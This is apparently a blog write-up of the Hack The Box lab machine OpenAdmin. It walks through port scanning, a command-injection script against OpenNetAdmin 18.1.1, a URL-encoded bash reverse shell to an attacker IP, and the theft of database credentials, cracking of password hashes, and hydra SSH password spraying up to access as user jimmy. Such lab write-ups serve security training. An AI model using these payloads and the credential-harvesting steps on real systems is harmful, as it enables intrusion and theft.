---
layout: single
title: OpenAdmin - Hack The Box
excerpt: "In this box we will be exploiting the OpenNetAdmin software, this is a system for tracking IP network attributes in a database, there are also several backend processes for building DHCP, DNS, router configuration, etc. We will get a reverse shell as the user www-data and gain access to the low privileged user jimmy thanks to credentials found in a database configuration file. Before getting root we will have to gain access to the user joanna and finally escalate privileges to root by abusing the nano binary."
date: 2021-08-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-openadmin/openadmin_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - opennetadmin
  - db creds
  - gtfobins
---

![](/assets/images/htb-writeup-openadmin/openadmin_logo.png)

# Description

In this box we will be exploiting the OpenNetAdmin software, this is a system for tracking IP network attributes in a database, there are also several backend processes for building DHCP, DNS, router configuration, etc. We will get a reverse shell as the user www-data and gain access to the low privileged user jimmy thanks to credentials found in a database configuration file. Before getting root we will have to gain access to the user joanna and finally escalate privileges to root by abusing the nano binary.

# Recognition phase

Let's start with which ports are open via the TCP protocol.
```
nmap -p- --open -T5 -v -n 10.10.10.171 -oN allPorts

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
- -p- scan all ports.
- --open becouse I only want it to scan ports with open status, not filtered or closed.
- -T5 to indicate the speed, 5 is the maximum point, at the cost of going faster in scanning this calls much attention, but no problem because in Hack The Box we are in a controlled environment. 
- -v verbose.
- -n To indicate that we do not want DNS resolution to be applied, this makes the scanning go a little faster.

Now let's launch some basic enumeration scripts and see what services and version are running on those ports.
```
nmap -sC -sV -p22,80 10.10.10.171 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- -sC equivalent to --script=default, this will cause basic enumeration scripts to be launched.
- -sV to determine service/version info.

The SSH service version does not seem to have any critical vulnerability, so we start with enumerating port 80, we launch a whatweb to know more about the http service but not having relevant information to enumerate extensions, we launch a simple fuzz.

```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/FUZZ
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.171/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 3499
________________________________________________

music                   [Status: 301, Size: 312, Words: 20, Lines: 10]
artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10]
sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [220560/220560] :: Job [1/1] :: 1220 req/sec :: Duration: [0:04:21] :: Errors: 0 ::
```
- -c for colorized output

# Web server recognition

Apache2 Ubuntu Default Page, there is nothing interesting in the source code.

![](/assets/images/htb-writeup-openadmin/apache-default.png)

### Let's see what ffuf found.

Exploring the three pages /music, /artwork and /sierra.

## http://10.10.10.171/music

![](/assets/images/htb-writeup-openadmin/music-page.png)

In the source code we do not find anything interesting, the other resources of the page only take us to some basic html templates, we also see that there is a potential registration >

![](/assets/images/htb-writeup-openadmin/ona-page.png)

We access the IP Address Management OpenNetAdmin as a guest user, looking for the default credentials of version 18.1.1 I found that they are admin:admin, we test them to discard default credentials and they work, we are logged in as administrator.

Here I paused before continuing with OpenNetAdmin to check the other pages that ffuf found but there is nothing interesting, only resources with html templates.

http://10.10.10.171/artwork

![](/assets/images/htb-writeup-openadmin/artwork-page.png)

http://10.10.10.171/sierra

![](/assets/images/htb-writeup-openadmin/sierra-page.png)

There doesn't seem to be anything interesting on those two pages, so let's move on to OpenNetAdmin.

### Search exploits for OpenNetAdmin v18.1.1

Searching a bit I found this script where apparently we get remote command execution.
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}"
done
```
What the script does is a loop of reading the commands that we enter by console and then through curl send it as data through the POST method to the url that we enter (http://10.10.10.171/ona).

We already know what the script does, but we can do it manually by modifying the variables that it takes in line 6, basically we indicate manually the command that we want to execute remotely and the url.
```
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" "http://10.10.10.171/ona/"
```
- Something I would like to point out is that with curl it is always good practice to add a / at the end when indicating the URL.

![](/assets/images/htb-writeup-openadmin/rce-works.png)

Perfect! we have remote command execution, let's see if we can send us a reverse shell with bash URL encoding.

```
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F443%200%3E%261%22&xajaxargs[]=ping" "http://10.10.10.171/ona/"
```

```
nc -nlvp 443

listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.171] 56534
bash: cannot set terminal process group (1248): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ whoami
whoami
www-data
www-data@openadmin:/opt/ona/www$
```

- Reverse shell with bash URL encoding

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
``` 

Now let's make a treatment of the TTY.
```
script /dev/null -c bash
Ctrl+Z
stty raw -echo
fg

reset
xterm
export TERM=xterm-256color
export SHELL=bash
```

# Privilege escalation.

### First, let's see which of the existing users have a bash.
```
www-data@openadmin:/opt/ona/www$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

### A good practice that I recommend in cases like these where there was a web server with potential users, is to look for a database configuration file.

```
www-data@openadmin:/opt/ona/www$ grep -r -i passwd
plugins/ona_nmap_scans/install.php:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
include/functions_db.inc.php:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
.htaccess.example:# You will need to create an .htpasswd file that conforms to the standard
.htaccess.example:# htaccess format, read the man page for htpasswd.  Change the 
.htaccess.example:# AuthUserFile option below as needed to reference your .htpasswd file.
.htaccess.example:# names, however, do need to be the same in both the .htpasswd and web
.htaccess.example:    #AuthUserFile /opt/ona/www/.htpasswd
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
winc/user_edit.inc.php:                    name="passwd"
winc/user_edit.inc.php:    if (!$form['id'] and !$form['passwd']) {
winc/user_edit.inc.php:    if ($form['passwd']) {
winc/user_edit.inc.php:        $form['passwd'] = md5($form['passwd']);
winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
winc/user_edit.inc.php:        if (strlen($form['passwd']) < 32) {
winc/user_edit.inc.php:            $form['passwd'] = $record['passwd'];
winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
winc/tooltips.inc.php://     Builds HTML for changing tacacs enable passwd
```
We found something very striking:
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!'

```
www-data@openadmin:/opt/ona/www$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Let's dump the database
```
www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 27
Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use ona_default
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql> describe users;
+----------+------------------+------+-----+-------------------+-----------------------------+
| Field    | Type             | Null | Key | Default           | Extra                       |
+----------+------------------+------+-----+-------------------+-----------------------------+
| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
| username | varchar(32)      | NO   | UNI | NULL              |                             |
| password | varchar(64)      | NO   |     | NULL              |                             |
| level    | int(4)           | NO   |     | 0                 |                             |
| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| atime    | datetime         | YES  |     | NULL              |                             |
+----------+------------------+------+-----+-------------------+-----------------------------+
6 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2021-08-22 14:37:31 | 2021-08-22 14:37:31 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
```

There are 2 users with passwords, let's try to unhash them to see if we can reuse them with any other user of the system.

[CrackStation](https://crackstation.net/)

098f6bcd4621d373cade4e832627b4f6:test
21232f297a57a5a743894a0e4a801fc3:admin

At this point, before continuing to list the system, let's try accessing a user with one of the three passwords we found. This could be done with hydra or medusa, then create two lists, one with the users who have a bash and the other with the three passwords found and start the attack.

```
cat users.txt                                                  
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ root
   2   │ jimmy
   3   │ joanna
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

cat pass.txt                  
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pass.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ test
   2   │ admin
   3   │ n1nj4W4rri0R!
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

Let's start the hydra.

```
hydra -L "users.txt" -P "pass.txt" -e nsr -s 22 ssh://10.10.10.171
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-22 17:27:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:3/p:6), ~2 tries per task
[DATA] attacking ssh://10.10.10.171:22/
[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-22 17:27:58
```
- -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login.

Well done! we found a reused password for the user jimmy.
